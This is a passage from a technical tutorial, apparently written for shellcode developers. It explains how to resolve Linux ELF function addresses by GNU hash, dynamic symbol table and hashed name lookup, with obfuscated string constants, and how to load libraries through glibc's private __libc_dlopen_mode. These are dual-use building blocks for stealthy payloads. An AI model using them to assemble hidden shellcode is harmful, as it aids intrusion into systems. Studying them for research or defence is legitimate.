    <span style='color:#800000; font-weight:bold; '>const</span> uint32_t  bloom_size  <span style='color:#808030; '>=</span> hashtab<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>bloom_size<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>const</span> uint32_t  bloom_shift <span style='color:#808030; '>=</span> hashtab<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>bloom_shift<span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>const</span> uint64_t<span style='color:#808030; '>*</span> bloom       <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#808030; '>&amp;</span>hashtab<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>bloom<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>const</span> uint32_t<span style='color:#808030; '>*</span> buckets     <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#808030; '>&amp;</span>bloom<span style='color:#808030; '>[</span>bloom_size<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>const</span> uint32_t<span style='color:#808030; '>*</span> chain       <span style='color:#808030; '>=</span> <span style='color:#808030; '>&amp;</span>buckets<span style='color:#808030; '>[</span>nbuckets<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>

    uint64_t word <span style='color:#808030; '>=</span> bloom<span style='color:#808030; '>[</span><span style='color:#808030; '>(</span>namehash <span style='color:#808030; '>/</span> ELFCLASS_BITS<span style='color:#808030; '>)</span> <span style='color:#808030; '>%</span> bloom_size<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    uint64_t mask <span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span>
        <span style='color:#808030; '>|</span> <span style='color:#808030; '>(</span>uint64_t<span style='color:#808030; '>)</span><span style='color:#008c00; '>1</span> <span style='color:#808030; '>&lt;</span><span style='color:#808030; '>&lt;</span> <span style='color:#808030; '>(</span>namehash <span style='color:#808030; '>%</span> ELFCLASS_BITS<span style='color:#808030; '>)</span>
        <span style='color:#808030; '>|</span> <span style='color:#808030; '>(</span>uint64_t<span style='color:#808030; '>)</span><span style='color:#008c00; '>1</span> <span style='color:#808030; '>&lt;</span><span style='color:#808030; '>&lt;</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>(</span>namehash <span style='color:#808030; '>></span><span style='color:#808030; '>></span> bloom_shift<span style='color:#808030; '>)</span> <span style='color:#808030; '>%</span> ELFCLASS_BITS<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>

    <span style='color:#800000; font-weight:bold; '>if</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>(</span>word <span style='color:#808030; '>&amp;</span> mask<span style='color:#808030; '>)</span> <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> mask<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>

    uint32_t symix <span style='color:#808030; '>=</span> buckets<span style='color:#808030; '>[</span>namehash <span style='color:#808030; '>%</span> nbuckets<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>if</span> <span style='color:#808030; '>(</span>symix <span style='color:#808030; '>&lt;</span> symoffset<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>

    <span style='color:#696969; '>/* Loop through the chain. */</span>
    <span style='color:#800000; font-weight:bold; '>for</span> <span style='color:#808030; '>(</span><span style='color:#800080; '>;</span><span style='color:#800080; '>;</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        <span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span><span style='color:#808030; '>*</span> symname <span style='color:#808030; '>=</span> strtab <span style='color:#808030; '>+</span> symtab<span style='color:#808030; '>[</span>symix<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>st_name<span style='color:#800080; '>;</span>
        <span style='color:#800000; font-weight:bold; '>const</span> uint32_t hash <span style='color:#808030; '>=</span> chain<span style='color:#808030; '>[</span>symix <span style='color:#808030; '>-</span> symoffset<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>        
        <span style='color:#800000; font-weight:bold; '>if</span> <span style='color:#808030; '>(</span>namehash<span style='color:#808030; '>|</span><span style='color:#008c00; '>1</span> <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> hash<span style='color:#808030; '>|</span><span style='color:#008c00; '>1</span> <span style='color:#808030; '>&amp;</span><span style='color:#808030; '>&amp;</span> _strcmp<span style='color:#808030; '>(</span>name<span style='color:#808030; '>,</span> symname<span style='color:#808030; '>)</span> <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
            <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>symtab<span style='color:#808030; '>[</span>symix<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>st_value<span style='color:#800080; '>;</span>
        <span style='color:#800080; '>}</span>
        <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>hash <span style='color:#808030; '>&amp;</span> <span style='color:#008c00; '>1</span><span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
        symix<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h3 id="dt_dynsym">7.3 Dynamic Symbol Table (DT_SYMTAB, DT_DYNSYM)</h3>

<p>The following function works similar to GetProcAddress on Windows and dlsym on Linux. Given a base address and name of function, lookup the virtual address of function. This approach requires using the hash table, but in the next example, I'll show a method similar to what's used in Windows shellcode.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>get_proc_address<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>module<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>name<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    Elf64_Dyn  <span style='color:#808030; '>*</span>symtab<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>strtab<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>hash<span style='color:#800080; '>;</span>
    Elf64_Sym  <span style='color:#808030; '>*</span>syms<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>char</span>       <span style='color:#808030; '>*</span>strs<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>void</span>       <span style='color:#808030; '>*</span>addr <span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 1. obtain pointers to string and symbol tables</span>
    strtab <span style='color:#808030; '>=</span> elf_get_dyn<span style='color:#808030; '>(</span>module<span style='color:#808030; '>,</span> DT_STRTAB<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    symtab <span style='color:#808030; '>=</span> elf_get_dyn<span style='color:#808030; '>(</span>module<span style='color:#808030; '>,</span> DT_SYMTAB<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>strtab <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span> <span style='color:#808030; '>|</span><span style='color:#808030; '>|</span> symtab <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 2. load virtual address of string and symbol tables</span>
    strs <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>char</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>strtab<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>d_un<span style='color:#808030; '>.</span>d_ptr<span style='color:#800080; '>;</span>
    syms <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>Elf64_Sym<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>symtab<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>d_un<span style='color:#808030; '>.</span>d_ptr<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 3. try obtain the ELF hash table</span>
    hash <span style='color:#808030; '>=</span> elf_get_dyn<span style='color:#808030; '>(</span>module<span style='color:#808030; '>,</span> DT_HASH<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 4. if we have it, lookup symbol by ELF hash</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>hash <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      addr <span style='color:#808030; '>=</span> elf_lookup<span style='color:#808030; '>(</span>name<span style='color:#808030; '>,</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>hash<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>d_un<span style='color:#808030; '>.</span>d_ptr<span style='color:#808030; '>,</span> syms<span style='color:#808030; '>,</span> strs<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span> <span style='color:#800000; font-weight:bold; '>else</span> <span style='color:#800080; '>{</span>
      <span style='color:#696969; '>// if we don't, try obtain the GNU hash table</span>
      hash <span style='color:#808030; '>=</span> elf_get_dyn<span style='color:#808030; '>(</span>module<span style='color:#808030; '>,</span> DT_GNU_HASH<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>hash <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        addr <span style='color:#808030; '>=</span> gnu_lookup<span style='color:#808030; '>(</span>name<span style='color:#808030; '>,</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>hash<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>d_un<span style='color:#808030; '>.</span>d_ptr<span style='color:#808030; '>,</span> syms<span style='color:#808030; '>,</span> strs<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#696969; '>// 5. did we find symbol? add base address and return</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>addr <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      addr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#808030; '>(</span><span style='color:#808030; '>(</span>uint64_t<span style='color:#808030; '>)</span>module <span style='color:#808030; '>+</span> addr<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> addr<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h3 id="dt_maru_hash">7.4 Using Hash Algorithm (SHT_SYMTAB, SHT_DYNSYM)</h3>

<p>Another way to lookup the address of a function and is in fact required for a statically linked binary is through the section headers. <code>get_proc_address2</code> given the base of a module will obtain the path of library and pass it to <code>get_proc_address3</code> will then search the symbol table for a function based on a hash of the string. </p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#696969; '>// lookup by hash using the base address of module</span>
<span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>get_proc_address2<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>module<span style='color:#808030; '>,</span> uint32_t hash<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>char</span>            <span style='color:#808030; '>*</span>path<span style='color:#808030; '>=</span><span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    Elf64_Phdr      <span style='color:#808030; '>*</span>phdr<span style='color:#800080; '>;</span>
    Elf64_Dyn       <span style='color:#808030; '>*</span>got<span style='color:#800080; '>;</span>
    uint64_t        <span style='color:#808030; '>*</span>ptrs<span style='color:#808030; '>,</span> addr<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span>map<span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>module <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 1. obtain pointer to dynamic program header</span>
    phdr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>Elf64_Phdr<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>elf_get_phdr<span style='color:#808030; '>(</span>module<span style='color:#808030; '>,</span> PT_DYNAMIC<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>phdr <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#696969; '>// 2. obtain global offset table</span>
      got <span style='color:#808030; '>=</span> elf_get_dyn<span style='color:#808030; '>(</span>module<span style='color:#808030; '>,</span> DT_PLTGOT<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>got <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        ptrs <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>uint64_t<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>got<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>d_un<span style='color:#808030; '>.</span>d_ptr<span style='color:#800080; '>;</span>
        map   <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>ptrs<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
        <span style='color:#696969; '>// 3. search through link_map for module</span>
        <span style='color:#800000; font-weight:bold; '>while</span> <span style='color:#808030; '>(</span>map <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
          <span style='color:#696969; '>// this our module?</span>
          <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>map<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>l_addr <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>uint64_t<span style='color:#808030; '>)</span>module<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
            path <span style='color:#808030; '>=</span> map<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>l_name<span style='color:#800080; '>;</span>
            <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
          <span style='color:#800080; '>}</span>
          map <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>struct</span> link_map <span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>map<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>l_next<span style='color:#800080; '>;</span>
        <span style='color:#800080; '>}</span>
      <span style='color:#800080; '>}</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#696969; '>// not found? exit</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>path <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    addr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>uint64_t<span style='color:#808030; '>)</span>get_proc_address3<span style='color:#808030; '>(</span>path<span style='color:#808030; '>,</span> hash<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#808030; '>(</span><span style='color:#808030; '>(</span>uint64_t<span style='color:#808030; '>)</span>module <span style='color:#808030; '>+</span> addr<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span> 
<span style='color:#800080; '>}</span>

<span style='color:#696969; '>// lookup by hash using the path of library (static lookup)</span>
<span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span> get_proc_address3<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>path<span style='color:#808030; '>,</span> uint32_t hash<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>         i<span style='color:#808030; '>,</span> fd<span style='color:#808030; '>,</span> cnt<span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    Elf64_Ehdr <span style='color:#808030; '>*</span>ehdr<span style='color:#800080; '>;</span>
    Elf64_Phdr <span style='color:#808030; '>*</span>phdr<span style='color:#800080; '>;</span>
    Elf64_Shdr <span style='color:#808030; '>*</span>shdr<span style='color:#800080; '>;</span>
    Elf64_Sym  <span style='color:#808030; '>*</span>syms<span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>void</span>       <span style='color:#808030; '>*</span>addr<span style='color:#808030; '>=</span><span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>char</span>       <span style='color:#808030; '>*</span>strs<span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    uint8_t    <span style='color:#808030; '>*</span>map<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>struct</span> stat fs<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>int</span>         str<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// /proc/self/exe</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x6f72702f</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x65732f63</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x652f666c</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x00006578</span><span style='color:#800080; '>;</span>

    <span style='color:#696969; '>// open file</span>
    fd <span style='color:#808030; '>=</span> _open<span style='color:#808030; '>(</span>path <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span> <span style='color:#800080; '>?</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>char</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>str <span style='color:#800080; '>:</span> path<span style='color:#808030; '>,</span> O_RDONLY<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>fd <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    <span style='color:#696969; '>// get the size</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>_fstat<span style='color:#808030; '>(</span>fd<span style='color:#808030; '>,</span> <span style='color:#808030; '>&amp;</span>fs<span style='color:#808030; '>)</span> <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#696969; '>// map into memory</span>
      map <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>uint8_t<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>_mmap<span style='color:#808030; '>(</span><span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>,</span> fs<span style='color:#808030; '>.</span>st_size<span style='color:#808030; '>,</span>  
        PROT_READ<span style='color:#808030; '>,</span> MAP_PRIVATE<span style='color:#808030; '>,</span> fd<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>map <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        ehdr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>Elf64_Ehdr<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>map<span style='color:#800080; '>;</span>
        shdr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>Elf64_Shdr<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#808030; '>(</span>map <span style='color:#808030; '>+</span> ehdr<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>e_shoff<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
        <span style='color:#696969; '>// locate static or dynamic symbol table</span>
        <span style='color:#800000; font-weight:bold; '>for</span><span style='color:#808030; '>(</span>i<span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span> i<span style='color:#808030; '>&lt;</span>ehdr<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>e_shnum<span style='color:#800080; '>;</span> i<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
          <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>shdr<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>sh_type <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> SHT_SYMTAB <span style='color:#808030; '>|</span><span style='color:#808030; '>|</span>
             shdr<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>sh_type <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> SHT_DYNSYM<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
            strs <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>char</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#808030; '>(</span>map <span style='color:#808030; '>+</span> shdr<span style='color:#808030; '>[</span>shdr<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>sh_link<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>sh_offset<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
            syms <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>Elf64_Sym<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#808030; '>(</span>map <span style='color:#808030; '>+</span> shdr<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>sh_offset<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
            cnt  <span style='color:#808030; '>=</span> shdr<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>sh_size<span style='color:#808030; '>/</span><span style='color:#800000; font-weight:bold; '>sizeof</span><span style='color:#808030; '>(</span>Elf64_Sym<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
          <span style='color:#800080; '>}</span>
        <span style='color:#800080; '>}</span>
        <span style='color:#696969; '>// loop through string table for function</span>
        <span style='color:#800000; font-weight:bold; '>for</span><span style='color:#808030; '>(</span>i<span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span> i<span style='color:#808030; '>&lt;</span>cnt<span style='color:#800080; '>;</span> i<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
          <span style='color:#696969; '>// if found, save address</span>
          <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>gnu_hash<span style='color:#808030; '>(</span><span style='color:#808030; '>&amp;</span>strs<span style='color:#808030; '>[</span>syms<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>st_name<span style='color:#808030; '>]</span><span style='color:#808030; '>)</span> <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> hash<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
            addr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>syms<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>st_value<span style='color:#800080; '>;</span>
          <span style='color:#800080; '>}</span>
        <span style='color:#800080; '>}</span>
        _munmap<span style='color:#808030; '>(</span>map<span style='color:#808030; '>,</span> fs<span style='color:#808030; '>.</span>st_size<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
    <span style='color:#800080; '>}</span>
    _close<span style='color:#808030; '>(</span>fd<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>return</span> addr<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h3 id="dlopen">8. Loading Shared Objects</h3>

<p>The normal way to load a shared object and resolve the address of a function is via <code>dlopen</code> and <code>dlsym</code> respectively. Both of these functions are exported by <code>libdl.so</code> - the dynamic linking library. For my build of Debian, <code>libc.so</code> doesn't use code inside <code>libdl.so</code> because the mechanics of loading libraries and resolving functions are actually within <code>ld-linux.so</code> - the dynamic linker/loader. This loader also doesn't export or make publicly available either of the functions required, but pointers to the real functions can be found in a read-only shared area of memory called <code>_rtld_global_ro</code> that is exposed via the symbol table. This is a structure defined in <code>/sysdeps/generic/ldsodefs.h</code> that when when compiled with <code>SHARED</code> defined will include pointers to the dynamic loading functions.</p>

<h3 id="libc_load">8.1 __libc_dlopen_mode and __libc_dlsym</h3>

<p>Before discussing anything about <code>_rtld_global_ro</code>, you can find functions in the symbol table of <code>libc.so</code> that allow you to dynamically load shared objects without using <code>libdl.so</code></p>

<pre>
user@nostromo:~/hub/shellcode$ readelf /lib/x86_64-linux-gnu/libc-2.24.so -s |grep -i "__libc_dl"
  1165: 000000000011fa60    17 FUNC    GLOBAL DEFAULT   13 __libc_dl_error_tsd@@GLIBC_PRIVATE
  1216: 000000000011f4b0    35 FUNC    GLOBAL DEFAULT   13 __libc_dlclose@@GLIBC_PRIVATE
  2043: 000000000011f440   100 FUNC    GLOBAL DEFAULT   13 __libc_dlsym@@GLIBC_PRIVATE
  2152: 000000000011f3f0    80 FUNC    GLOBAL DEFAULT   13 __libc_dlopen_mode@@GLIBC_PRIVATE
</pre>

<p>To load libraries, we need to resolve the address of <code>__libc_dlopen_mode</code> and if we want to resolve the address of functions by string, we also need <code>__libc_dlsym</code>. The following code shows how you might load <code>libgnutls.so</code> using a static path.</p>

